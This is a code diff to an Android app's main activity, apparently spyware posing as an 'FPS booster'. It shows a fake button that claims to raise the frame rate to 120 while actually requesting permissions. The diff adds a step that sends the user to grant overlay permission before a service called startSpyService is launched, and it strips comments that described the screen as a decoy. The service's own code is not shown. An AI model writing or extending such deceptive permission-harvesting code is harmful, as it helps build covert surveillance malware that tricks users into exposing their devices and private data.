@@ -3,8 +3,10 @@ package com.ratnik.app
 import android.Manifest
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.provider.Settings
 import android.view.Gravity
 import android.widget.Button
 import android.widget.LinearLayout
@@ -17,7 +19,6 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         
-        // Создаем заглушку
         val layout = LinearLayout(this)
         layout.orientation = LinearLayout.VERTICAL
         layout.gravity = Gravity.CENTER
@@ -42,11 +43,9 @@ class MainActivity : AppCompatActivity() {
         btn.text = "УСКОРИТЬ FPS"
         btn.setOnClickListener {
             status.text = "FPS увеличен до 120!"
-            // При нажатии проверяем разрешения и запускаем сервис
             checkPermissionsAndStart()
         }
         layout.addView(btn)
-
         setContentView(layout)
     }
 
@@ -65,6 +64,29 @@ class MainActivity : AppCompatActivity() {
         if (missing.isNotEmpty()) {
             ActivityCompat.requestPermissions(this, missing.toTypedArray(), 101)
         } else {
+            requestOverlayAndStart()
+        }
+    }
+
+    private fun requestOverlayAndStart() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
+            startActivityForResult(intent, 102)
+        } else {
+            startSpyService()
+        }
+    }
+
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == 101) {
+            requestOverlayAndStart()
+        }
+    }
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == 102) {
             startSpyService()
         }
     }
@@ -75,14 +97,6 @@ class MainActivity : AppCompatActivity() {
             startForegroundService(intent)
         } else {
             startService(intent)
-        }
-    }
-
-    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        // После того как пользователь нажал "Разрешить", запускаем сервис
-        if (requestCode == 101) {
-            startSpyService()
         }
     }
 }
